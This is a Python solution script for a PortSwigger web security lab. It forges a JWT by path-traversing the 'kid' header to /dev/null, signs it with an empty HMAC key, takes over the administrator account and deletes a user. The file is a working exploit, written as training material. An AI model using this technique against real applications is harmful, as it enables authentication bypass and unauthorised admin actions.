"""
Lab 6: JWT authentication bypass via kid header path traversal
https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-kid-header-path-traversal
Difficulty: Practitioner

📝 The flaw: "kid" is used to build a filesystem path to the key used for
verification (e.g. `/keys/{kid}`). Path-traverse it to a predictable file
with known (often empty) content, then sign with THAT as the HMAC key.

Classic target: ../../../../dev/null (empty bytes) — HS256 with key = b"".
"""

from utils import get_session, log, note, decode_jwt, forge_hs256_token

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"
WIENER = {"username": "wiener", "password": "peter"}

# Adjust depth to match the server's actual key directory — confirm in Burp
# by sending a kid that doesn't exist and reading the error for the real path.
KID_PAYLOAD = "../../../../../../dev/null"


def run():
    s = get_session()
    r = s.post(f"{TARGET}/login", data=WIENER)
    token = s.cookies.get("session")
    header, payload = decode_jwt(token)
    note(f"Original header: {header}")

    header["kid"] = KID_PAYLOAD
    payload["sub"] = "administrator"

    note("Signing with HMAC key = b'' (empty) since /dev/null reads as 0 bytes.")
    forged = forge_hs256_token(header, payload, key=b"")

    s.cookies.set("session", forged)
    r = s.get(f"{TARGET}/admin")
    log(f"/admin status: {r.status_code}")

    if r.status_code != 200:
        note("If this fails, the traversal depth is probably wrong — try fewer")
        note("or more '../' segments, or try url-encoding them (%2e%2e%2f).")
        return

    r = s.post(f"{TARGET}/admin/delete", params={"username": "carlos"})
    log(f"Delete carlos responded {r.status_code}")


if __name__ == "__main__":
    run()
